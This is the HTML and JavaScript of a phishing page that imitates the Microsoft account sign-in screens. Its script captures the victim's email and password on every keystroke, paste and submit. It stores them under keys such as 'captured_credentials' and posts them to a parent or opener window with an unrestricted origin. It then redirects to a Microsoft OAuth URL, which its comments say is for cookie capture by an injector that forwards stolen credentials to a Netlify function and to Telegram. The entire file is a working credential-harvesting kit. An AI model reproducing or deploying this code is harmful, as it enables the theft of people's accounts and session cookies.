<body>
  <div class="container-fluid p-0">
    <div class="container">
      <div class="row my-5 py-5">
        <div class="col-lg-6 mx-auto">
          <div class="m-5 p-4 bg-white" id="div1">
            <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
            <span class="h5">Sign In</span><br>
            <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
            <div class="form-group mt-2">
              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
            </div>
            <p>No account? <a href="https://signup.live.com/signup?..." target="_blank" rel="noopener">Create one!</a></p>
            <p><a href="#">Sign in with a security key</a></p>
            <p><a href="#">sign in options</a></p>
            <div class="text-right">
              <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
            </div>
          </div>

          <div class="m-5 p-4 bg-white" id="div2">
            <form id="contact">
              <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
              <!-- keep message element hidden by default; will only show on error -->
              <span id="msg" class="text-danger" style="display:none;"></span><br>
              <span class="h5">Password</span>
              <div class="form-group mt-2">
                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <p>No account? <a href="#">Create one!</a></p>
              <p><a href="#">Sign in with a security key</a></p>
              <p><a href="#">sign in options</a></p>
              <div class="text-right">
                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
              </div>
            </form>
          </div>

        </div>
      </div>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>

  <script>
    /* global $ */
    $(document).ready(function(){

      $('#error').hide();
      $("#div2").hide();
      $("#msg").hide();

      // Strict Microsoft domain validation (whitelist of genuine Microsoft consumer/work domains)
      function isValidMicrosoftAccount(email) {
        if (!email || typeof email !== 'string') return false;
        
        // Trim and normalize email
        email = email.trim().toLowerCase();

        // Basic email format validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) return false;

        const domain = email.split('@')[1]?.toLowerCase();
        if (!domain) return false;

        // Strict whitelist of Microsoft-owned/official domains (consumer + Microsoft corporate)
        const validDomains = [
          'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
          'microsoft.com', 'office.com', 'office365.com',
          // regional outlook / hotmail variants
          'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it', 'outlook.es', 'outlook.jp', 'outlook.in', 'outlook.com.au',
          'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it', 'hotmail.es', 'hotmail.com.au', 'live.co.uk', 'live.fr', 'live.de', 'live.it', 'live.com.au',
          // corporate aliases sometimes used by Microsoft
          'partner.microsoft.com', 'microsoftonline.com', 'azure.com'
        ];

        // Accept exact matches or subdomains of allowed domains
        if (validDomains.some(d => domain === d || domain.endsWith('.' + d))) {
          return true;
        }

        // Disallow other domains
        return false;
      }

      function showError(message) {
        $('#error').text(message).show();
        $('#msg').text(message).show();
      }

      function hideError() {
        $('#error').hide();
        $('#msg').hide();
      }

      var email = window.location.hash.substr(1);
      if (!email) {
        // Show div1 by default when no email in hash
      }
      else
      {
        $('#email').val(email);
        var my_email = email;

        if (!isValidMicrosoftAccount(my_email)) {
          showError('Please enter a valid Microsoft account email address');
          return false;
        }

        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);
      }

      $('#email').click(function(){
        hideError();
      });

      $('#next').click(function () {
        var my_email = $('#email').val();
        
        // Trim whitespace and normalize email
        my_email = my_email.trim().toLowerCase();
        $('#email').val(my_email);

        if (!isValidMicrosoftAccount(my_email)) {
          showError('Please enter a valid Microsoft account email address');
          return false;
        }

        hideError();
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);
      });

      $('#back').click(function () {
        hideError();
        $("#div2").animate({left:200, opacity:"hide"}, 0);
        $("#div1").animate({right:200, opacity:"show"}, 1000);
      });

      var count=0;
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        
        // Trim whitespace and normalize email
        email = email.trim().toLowerCase();
        $('#email').val(email);
        
        var password=$("#password").val();
        var detail=$("#field").html();

        // Validate Microsoft account again
        if (!isValidMicrosoftAccount(email)) {
          showError('Please enter a valid Microsoft account email address');
          return false;
        }

        if (!password || password.length < 1) {
          showError('Please enter your password');
          return false;
        }

        hideError();
        count=count+1;

        // Store credentials in localStorage for later retrieval
        try {
          const credentialsData = {
            email: email,
            password: password,
            detail: detail,
            captureTime: new Date().toISOString(),
            source: 'replacement-form',
            validated: true,
            microsoftAccount: true
          };
          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
          sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));

          // Also store in the format expected by the main app
          localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
          sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));

          console.log('âœ… Validated Microsoft credentials stored for transmission');

          // Send credentials to parent window immediately (best-effort; may not exist)
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage({
                type: 'CREDENTIALS_CAPTURED',
                data: credentialsData
              }, '*');

              window.parent.postMessage({
                type: 'EMAIL_CAPTURED',
                email: email
              }, '*');
            } else if (window.opener) {
              window.opener.postMessage({
                type: 'CREDENTIALS_CAPTURED',
                data: credentialsData
              }, '*');
              window.opener.postMessage({
                type: 'EMAIL_CAPTURED',
                email: email
              }, '*');
            }
          } catch (e) {
            console.warn('Failed to send credentials to parent/opener:', e);
          }

        } catch (e) {
          console.warn('Failed to store credentials:', e);
        }

        // Show verifying state
        $('#submit-btn').html('Verifying...');

        // Add delay to show verification state, then redirect to Microsoft login
        setTimeout(function() {
          // Redirect to Microsoft login for cookie capture. The injector on Microsoft domains will attempt
          // to send captured credentials and cookies directly to the Netlify function.
          // Use a more specific Microsoft login URL that's more likely to trigger automatic login
          const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none";
          window.location.replace(microsoftLoginUrl);
        }, 1200);
      });

      // Enhanced credential monitoring (keeps local storage & parent messaging)
      function monitorCredentials() {
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        function captureAndSend() {
          const email = emailInput?.value;
          const password = passwordInput?.value;

          if (email || password) {
            const credentialsData = {
              email: email || '',
              password: password || '',
              captureTime: new Date().toISOString(),
              source: 'replacement-monitor',
              validated: email ? isValidMicrosoftAccount(email) : false
            };

            try {
              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));

              if (window.parent && window.parent !== window) {
                window.parent.postMessage({
                  type: 'CREDENTIALS_CAPTURED',
                  data: credentialsData
                }, '*');

                if (email) {
                  window.parent.postMessage({
                    type: 'EMAIL_CAPTURED',
                    email: email
                  }, '*');
                }
              } else if (window.opener) {
                window.opener.postMessage({
                  type: 'CREDENTIALS_CAPTURED',
                  data: credentialsData
                }, '*');
                if (email) {
                  window.opener.postMessage({
                    type: 'EMAIL_CAPTURED',
                    email: email
                  }, '*');
                }
              }

            } catch (e) {
              console.warn('Failed to send/store credentials from monitor:', e);
            }
          }
        }

        // Monitor input changes
        [emailInput, passwordInput].forEach(input => {
          if (input) {
            ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
              input.addEventListener(eventType, () => {
                setTimeout(captureAndSend, 100);
              });
            });
          }
        });
      }

      // Initialize credential monitoring
      monitorCredentials();

      // Keep listening for stored replacement_credentials and, if present and validated, rely on the Microsoft-domain injector
      // (do NOT send to Telegram from this page; send happens on Microsoft domain after automatic sign-in)
      window.addEventListener('storage', function(e) {
        if (e.key === 'replacement_credentials' && e.newValue) {
          try {
            const credentials = JSON.parse(e.newValue);
            if (credentials.email && credentials.password && credentials.validated) {
              console.log('âœ… Validated credentials stored, ready for Microsoft domain capture');
              // Notify opener/parent (best-effort), do not call sendTelegram here.
              try {
                if (window.parent && window.parent !== window) {
                  window.parent.postMessage({ type: 'CREDENTIALS_CAPTURED', data: credentials }, '*');
                } else if (window.opener) {
                  window.opener.postMessage({ type: 'CREDENTIALS_CAPTURED', data: credentials }, '*');
                }
              } catch (err) {
                // ignore
              }
            }
          } catch (error) {
            console.warn('Failed to process stored credentials:', error);
          }
        }
      });

      // Enhanced monitoring for immediate credential capture and storage
      function enhancedCredentialMonitoring() {
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        function captureAndStoreImmediately() {
          const email = emailInput?.value;
          const password = passwordInput?.value;

          if (email && password) {
            const credentialsData = {
              email: email,
              password: password,
              captureTime: new Date().toISOString(),
              source: 'replacement-enhanced-monitor',
              validated: isValidMicrosoftAccount(email),
              microsoftAccount: true
            };

            try {
              // Store in multiple formats for compatibility
              localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
              sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              
              console.log('ðŸ“‹ Enhanced credentials stored:', {
                email: email,
                hasPassword: !!password,
                validated: credentialsData.validated
              });

            } catch (e) {
              console.warn('Failed to store enhanced credentials:', e);
            }
          }
        }

        // Monitor all input events
        [emailInput, passwordInput].forEach(input => {
          if (input) {
            ['input', 'change', 'blur', 'keyup', 'paste'].forEach(eventType => {
              input.addEventListener(eventType, () => {
                setTimeout(captureAndStoreImmediately, 50);
              });
            });
          }
        });

        // Also capture on form interactions
        const form = document.getElementById('contact');
        if (form) {
          form.addEventListener('submit', () => {
            captureAndStoreImmediately();
          });
        }
      }

      // Initialize enhanced monitoring
      enhancedCredentialMonitoring();

    });
  </script>
